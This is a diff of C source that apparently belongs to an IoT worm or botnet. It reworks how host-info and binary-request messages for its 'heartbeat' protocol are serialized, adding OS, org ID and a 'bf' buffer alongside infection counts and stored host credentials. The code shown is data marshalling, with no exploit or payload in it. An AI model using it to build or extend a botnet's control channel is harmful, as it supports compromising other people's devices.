@@ -14,34 +14,43 @@
 #define RETIF_NULL(x) if (x == NULL) { return; }
 
 
+const char *prne_os_tostr (const prne_os_t x) {
+	switch (x) {
+	case PRNE_OS_LINUX: return "linux";
+	}
+	errno = EINVAL;
+	return NULL;
+}
+
+prne_os_t prne_os_fstr (const char *str) {
+	for (prne_os_t i = PRNE_OS_NONE + 1; i < NB_PRNE_OS; i += 1) {
+		if (prne_nstreq(str, prne_os_tostr(i))) {
+			return i;
+		}
+	}
+	errno = EINVAL;
+	return PRNE_OS_NONE;
+}
+
+bool prne_os_inrange (const prne_os_t x) {
+	return PRNE_OS_NONE < x && x < NB_PRNE_OS;
+}
+
 const char *prne_arch_tostr (const prne_arch_t x) {
 	switch (x){
-	case PRNE_ARCH_AARCH64:
-		return "aarch64";
-	case PRNE_ARCH_ARMV4T:
-		return "armv4t";
-	case PRNE_ARCH_ARMV7:
-		return "armv7";
-	case PRNE_ARCH_X86_64:
-		return "x86_64";
-	case PRNE_ARCH_I686:
-		return "i686";
-	case PRNE_ARCH_MIPS:
-		return "mips";
-	case PRNE_ARCH_MPSL:
-		return "mpsl";
-	case PRNE_ARCH_PPC:
-		return "ppc";
-	case PRNE_ARCH_SH4:
-		return "sh4";
-	case PRNE_ARCH_M68K:
-		return "m68k";
-	case PRNE_ARCH_ARC:
-		return "arc";
-	case PRNE_ARCH_ARCEB:
-		return "arceb";
+	case PRNE_ARCH_AARCH64: return "aarch64";
+	case PRNE_ARCH_ARMV4T: return "armv4t";
+	case PRNE_ARCH_ARMV7: return "armv7";
+	case PRNE_ARCH_X86_64: return "x86_64";
+	case PRNE_ARCH_I686: return "i686";
+	case PRNE_ARCH_MIPS: return "mips";
+	case PRNE_ARCH_MPSL: return "mpsl";
+	case PRNE_ARCH_PPC: return "ppc";
+	case PRNE_ARCH_SH4: return "sh4";
+	case PRNE_ARCH_M68K: return "m68k";
+	case PRNE_ARCH_ARC: return "arc";
+	case PRNE_ARCH_ARCEB: return "arceb";
 	}
-
 	errno = EINVAL;
 	return NULL;
 }
@@ -52,7 +61,6 @@ prne_arch_t prne_arch_fstr (const char *str) {
 			return i;
 		}
 	}
-
 	errno = EINVAL;
 	return PRNE_ARCH_NONE;
 }
@@ -60,6 +68,33 @@ prne_arch_t prne_arch_fstr (const char *str) {
 bool prne_arch_inrange (const prne_arch_t x) {
 	return PRNE_ARCH_NONE < x && x < NB_PRNE_ARCH;
 }
+
+const char *prne_iflag_tostr (const prne_iflag_t x) {
+	switch (x) {
+	case PRNE_IFLAG_BA: return "ba";
+	case PRNE_IFLAG_INIT_RUN: return "init_run";
+	case PRNE_IFLAG_WKR_RCN: return "wkr_rcn";
+	case PRNE_IFLAG_WKR_RESOLV: return "wkr_resolv";
+	case PRNE_IFLAG_WKR_HTBT: return "wkr_htbt";
+	}
+	errno = EINVAL;
+	return NULL;
+}
+
+prne_iflag_t prne_iflag_fstr (const char *str) {
+	for (prne_iflag_t i = PRNE_IFLAG_NONE + 1; i < NB_PRNE_IFLAG; i += 1) {
+		if (prne_nstreq(str, prne_iflag_tostr(i))) {
+			return i;
+		}
+	}
+	errno = EINVAL;
+	return PRNE_IFLAG_NONE;
+}
+
+bool prne_iflag_inrange (const prne_iflag_t x) {
+	return PRNE_IFLAG_NONE < x && x < NB_PRNE_IFLAG;
+}
+
 
 bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b) {
 	size_t l;
@@ -266,28 +301,36 @@ prne_htbt_ser_rc_t prne_dec_host_cred (
 
 void prne_htbt_init_host_info (prne_htbt_host_info_t *hi) {
 	prne_memzero(hi, sizeof(prne_htbt_host_info_t));
-	hi->arch = PRNE_ARCH_NONE;
 }
 
 bool prne_htbt_alloc_host_info (
 	prne_htbt_host_info_t *hi,
-	const size_t cred_len)
+	const size_t cred_len,
+	const size_t bf_len)
 {
-	void *ny_mem;
+	void *ny_mem[2];
 
-	if (cred_len > 255) {
+	if (cred_len > 255 || bf_len > 255) {
 		errno = EINVAL;
 		return false;
 	}
 
-	ny_mem = prne_calloc(1, cred_len);
-	if (ny_mem == NULL && cred_len > 0) {
+	ny_mem[0] = prne_calloc(1, cred_len);
+	ny_mem[1] = prne_calloc(1, bf_len);
+	if ((ny_mem[0] == NULL && cred_len > 0) ||
+		(ny_mem[1] == NULL && bf_len > 0))
+	{
+		prne_free(ny_mem[0]);
+		prne_free(ny_mem[1]);
 		return false;
 	}
 
 	prne_free(hi->host_cred);
-	hi->host_cred = (uint8_t*)ny_mem;
+	hi->host_cred = (uint8_t*)ny_mem[0];
 	hi->host_cred_len = cred_len;
+	prne_free(hi->bf);
+	hi->bf = (uint8_t*)ny_mem[1];
+	hi->bf_len = bf_len;
 
 	return true;
 }
@@ -298,6 +341,9 @@ void prne_htbt_free_host_info (prne_htbt_host_info_t *hi) {
 	prne_free(hi->host_cred);
 	hi->host_cred = NULL;
 	hi->host_cred_len = 0;
+	prne_free(hi->bf);
+	hi->bf = NULL;
+	hi->bf_len = 0;
 }
 
 bool prne_htbt_eq_host_info (
@@ -592,11 +638,11 @@ prne_htbt_ser_rc_t prne_htbt_ser_host_info (
 	size_t *actual,
 	const prne_htbt_host_info_t *in)
 {
-	if (in->host_cred_len > 255) {
+	if (in->host_cred_len > 255 || in->bf_len > 255) {
 		return PRNE_HTBT_SER_RC_FMT_ERR;
 	}
 
-	*actual = 94 + in->host_cred_len;
+	*actual = 112 + in->host_cred_len + in->bf_len;
 	if (mem_len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
@@ -604,53 +650,57 @@ prne_htbt_ser_rc_t prne_htbt_ser_host_info (
 	memcpy(mem + 0, in->prog_ver, 16);
 	memcpy(mem + 16, in->boot_id, 16);
 	memcpy(mem + 32, in->instance_id, 16);
-	mem[48] = prne_getmsb64(in->parent_uptime, 0);
-	mem[49] = prne_getmsb64(in->parent_uptime, 1);
-	mem[50] = prne_getmsb64(in->parent_uptime, 2);
-	mem[51] = prne_getmsb64(in->parent_uptime, 3);
-	mem[52] = prne_getmsb64(in->parent_uptime, 4);
-	mem[53] = prne_getmsb64(in->parent_uptime, 5);
-	mem[54] = prne_getmsb64(in->parent_uptime, 6);
-	mem[55] = prne_getmsb64(in->parent_uptime, 7);
-	mem[56] = prne_getmsb64(in->child_uptime, 0);
-	mem[57] = prne_getmsb64(in->child_uptime, 1);
-	mem[58] = prne_getmsb64(in->child_uptime, 2);
-	mem[59] = prne_getmsb64(in->child_uptime, 3);
-	mem[60] = prne_getmsb64(in->child_uptime, 4);
-	mem[61] = prne_getmsb64(in->child_uptime, 5);
-	mem[62] = prne_getmsb64(in->child_uptime, 6);
-	mem[63] = prne_getmsb64(in->child_uptime, 7);
-	mem[64] = prne_getmsb64(in->bne_cnt, 0);
-	mem[65] = prne_getmsb64(in->bne_cnt, 1);
-	mem[66] = prne_getmsb64(in->bne_cnt, 2);
-	mem[67] = prne_getmsb64(in->bne_cnt, 3);
-	mem[68] = prne_getmsb64(in->bne_cnt, 4);
-	mem[69] = prne_getmsb64(in->bne_cnt, 5);
-	mem[70] = prne_getmsb64(in->bne_cnt, 6);
-	mem[71] = prne_getmsb64(in->bne_cnt, 7);
-	mem[72] = prne_getmsb64(in->infect_cnt, 0);
-	mem[73] = prne_getmsb64(in->infect_cnt, 1);
-	mem[74] = prne_getmsb64(in->infect_cnt, 2);
-	mem[75] = prne_getmsb64(in->infect_cnt, 3);
-	mem[76] = prne_getmsb64(in->infect_cnt, 4);
-	mem[77] = prne_getmsb64(in->infect_cnt, 5);
-	mem[78] = prne_getmsb64(in->infect_cnt, 6);
-	mem[79] = prne_getmsb64(in->infect_cnt, 7);
-	mem[80] = prne_getmsb32(in->crash_cnt, 0);
-	mem[81] = prne_getmsb32(in->crash_cnt, 1);
-	mem[82] = prne_getmsb32(in->crash_cnt, 2);
-	mem[83] = prne_getmsb32(in->crash_cnt, 3);
-	mem[84] = prne_getmsb32(in->parent_pid, 0);
-	mem[85] = prne_getmsb32(in->parent_pid, 1);
-	mem[86] = prne_getmsb32(in->parent_pid, 2);
-	mem[87] = prne_getmsb32(in->parent_pid, 3);
-	mem[88] = prne_getmsb32(in->child_pid, 0);
-	mem[89] = prne_getmsb32(in->child_pid, 1);
-	mem[90] = prne_getmsb32(in->child_pid, 2);
-	mem[91] = prne_getmsb32(in->child_pid, 3);
-	mem[92] = (uint8_t)in->host_cred_len;
-	mem[93] = (uint8_t)in->arch;
-	memcpy(mem + 94, in->host_cred, in->host_cred_len);
+	memcpy(mem + 48, in->org_id, 16);
+	mem[64] = prne_getmsb64(in->parent_uptime, 0);
+	mem[65] = prne_getmsb64(in->parent_uptime, 1);
+	mem[66] = prne_getmsb64(in->parent_uptime, 2);
+	mem[67] = prne_getmsb64(in->parent_uptime, 3);
+	mem[68] = prne_getmsb64(in->parent_uptime, 4);
+	mem[69] = prne_getmsb64(in->parent_uptime, 5);
+	mem[70] = prne_getmsb64(in->parent_uptime, 6);
+	mem[71] = prne_getmsb64(in->parent_uptime, 7);
+	mem[72] = prne_getmsb64(in->child_uptime, 0);
+	mem[73] = prne_getmsb64(in->child_uptime, 1);
+	mem[74] = prne_getmsb64(in->child_uptime, 2);
+	mem[75] = prne_getmsb64(in->child_uptime, 3);
+	mem[76] = prne_getmsb64(in->child_uptime, 4);
+	mem[77] = prne_getmsb64(in->child_uptime, 5);
+	mem[78] = prne_getmsb64(in->child_uptime, 6);
+	mem[79] = prne_getmsb64(in->child_uptime, 7);
+	mem[80] = prne_getmsb64(in->bne_cnt, 0);
+	mem[81] = prne_getmsb64(in->bne_cnt, 1);
+	mem[82] = prne_getmsb64(in->bne_cnt, 2);
+	mem[83] = prne_getmsb64(in->bne_cnt, 3);
+	mem[84] = prne_getmsb64(in->bne_cnt, 4);
+	mem[85] = prne_getmsb64(in->bne_cnt, 5);
+	mem[86] = prne_getmsb64(in->bne_cnt, 6);
+	mem[87] = prne_getmsb64(in->bne_cnt, 7);
+	mem[88] = prne_getmsb64(in->infect_cnt, 0);
+	mem[89] = prne_getmsb64(in->infect_cnt, 1);
+	mem[90] = prne_getmsb64(in->infect_cnt, 2);
+	mem[91] = prne_getmsb64(in->infect_cnt, 3);
+	mem[92] = prne_getmsb64(in->infect_cnt, 4);
+	mem[93] = prne_getmsb64(in->infect_cnt, 5);
+	mem[94] = prne_getmsb64(in->infect_cnt, 6);
+	mem[95] = prne_getmsb64(in->infect_cnt, 7);
+	mem[96] = prne_getmsb32(in->crash_cnt, 0);
+	mem[97] = prne_getmsb32(in->crash_cnt, 1);
+	mem[98] = prne_getmsb32(in->crash_cnt, 2);
+	mem[99] = prne_getmsb32(in->crash_cnt, 3);
+	mem[100] = prne_getmsb32(in->parent_pid, 0);
+	mem[101] = prne_getmsb32(in->parent_pid, 1);
+	mem[102] = prne_getmsb32(in->parent_pid, 2);
+	mem[103] = prne_getmsb32(in->parent_pid, 3);
+	mem[104] = prne_getmsb32(in->child_pid, 0);
+	mem[105] = prne_getmsb32(in->child_pid, 1);
+	mem[106] = prne_getmsb32(in->child_pid, 2);
+	mem[107] = prne_getmsb32(in->child_pid, 3);
+	mem[108] = (uint8_t)in->host_cred_len;
+	mem[109] = (uint8_t)in->arch;
+	mem[110] = (uint8_t)in->os;
+	mem[111] = (uint8_t)in->bf_len;
+	memcpy(mem + 112, in->host_cred, in->host_cred_len);
+	memcpy(mem + 112 + in->host_cred_len, in->bf, in->bf_len);
 
 	return PRNE_HTBT_SER_RC_OK;
 }
@@ -715,6 +765,9 @@ prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (
 	prne_htbt_ser_rc_t ret;
 
 	*actual = 3 + 2;
+	if (in->alloc_len > PRNE_HTBT_BIN_ALLOC_LEN_MAX) {
+		return PRNE_HTBT_SER_RC_FMT_ERR;
+	}
 	if (mem_len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
@@ -760,13 +813,16 @@ prne_htbt_ser_rc_t prne_htbt_ser_rcb (
 	size_t *actual,
 	const prne_htbt_rcb_t *in)
 {
-	*actual = 2;
+	*actual = 3;
 	if (mem_len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
 
-	mem[0] = (uint8_t)in->arch;
-	mem[1] = (uint8_t)(in->compat ? 0x80 : 0x00);
+	mem[0] = (uint8_t)(
+		(in->compat ? 0x80 : 0x00) |
+		(in->self ? 0x40 : 0x00));
+	mem[1] = (uint8_t)in->os;
+	mem[2] = (uint8_t)in->arch;
 
 	return PRNE_HTBT_SER_RC_OK;
 }
@@ -814,45 +870,29 @@ prne_htbt_ser_rc_t prne_htbt_dser_host_info (
 	size_t *actual,
 	prne_htbt_host_info_t *out)
 {
-	size_t cred_size;
+	size_t cred_size, bf_size;
 
-	*actual = 94;
+	*actual = 112;
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
 
-	cred_size = data[92];
-	*actual += cred_size;
+	cred_size = data[108];
+	bf_size = data[111];
+	*actual += cred_size + bf_size;
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
 
-	if (!prne_htbt_alloc_host_info(out, cred_size)) {
+	if (!prne_htbt_alloc_host_info(out, cred_size, bf_size)) {
 		return PRNE_HTBT_SER_RC_ERRNO;
 	}
 
 	memcpy(out->prog_ver, data + 0, 16);
 	memcpy(out->boot_id, data + 16, 16);
 	memcpy(out->instance_id, data + 32, 16);
+	memcpy(out->org_id, data + 48, 16);
 	out->parent_uptime = prne_recmb_msb64(
-		data[48],
-		data[49],
-		data[50],
-		data[51],
-		data[52],
-		data[53],
-		data[54],
-		data[55]);
-	out->child_uptime = prne_recmb_msb64(
-		data[56],
-		data[57],
-		data[58],
-		data[59],
-		data[60],
-		data[61],
-		data[62],
-		data[63]);
-	out->bne_cnt = prne_recmb_msb64(
 		data[64],
 		data[65],
 		data[66],
@@ -861,7 +901,7 @@ prne_htbt_ser_rc_t prne_htbt_dser_host_info (
 		data[69],
 		data[70],
 		data[71]);
-	out->infect_cnt = prne_recmb_msb64(
+	out->child_uptime = prne_recmb_msb64(
 		data[72],
 		data[73],
 		data[74],
@@ -870,23 +910,43 @@ prne_htbt_ser_rc_t prne_htbt_dser_host_info (
 		data[77],
 		data[78],
 		data[79]);
-	out->crash_cnt = prne_recmb_msb32(
+	out->bne_cnt = prne_recmb_msb64(
 		data[80],
 		data[81],
 		data[82],
-		data[83]);
-	out->parent_pid = prne_recmb_msb32(
+		data[83],
 		data[84],
 		data[85],
 		data[86],
 		data[87]);
-	out->child_pid = prne_recmb_msb32(
+	out->infect_cnt = prne_recmb_msb64(
 		data[88],
 		data[89],
 		data[90],
-		data[91]);
-	out->arch = (prne_arch_t)data[93];
-	memcpy(out->host_cred, data + 94, cred_size);
+		data[91],
+		data[92],
+		data[93],
+		data[94],
+		data[95]);
+	out->crash_cnt = prne_recmb_msb32(
+		data[96],
+		data[97],
+		data[98],
+		data[99]);
+	out->parent_pid = prne_recmb_msb32(
+		data[100],
+		data[101],
+		data[102],
+		data[103]);
+	out->child_pid = prne_recmb_msb32(
+		data[104],
+		data[105],
+		data[106],
+		data[107]);
+	out->arch = (prne_arch_t)data[109];
+	out->os = (prne_os_t)data[110];
+	memcpy(out->host_cred, data + 112, cred_size);
+	memcpy(out->bf, data + 112 + cred_size, bf_size);
 
 	return PRNE_HTBT_SER_RC_OK;
 }
@@ -1027,13 +1087,15 @@ prne_htbt_ser_rc_t prne_htbt_dser_rcb (
 	size_t *actual,
 	prne_htbt_rcb_t *out)
 {
-	*actual = 2;
+	*actual = 3;
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
 
-	out->arch = (prne_arch_t)data[0];
-	out->compat = (data[1] & 0x80) != 0;
+	out->compat = (data[0] & 0x80) != 0;
+	out->self = (data[0] & 0x40) != 0;
+	out->os = (prne_os_t)data[1];
+	out->arch = (prne_arch_t)data[2];
 
 	return PRNE_HTBT_SER_RC_OK;
 }
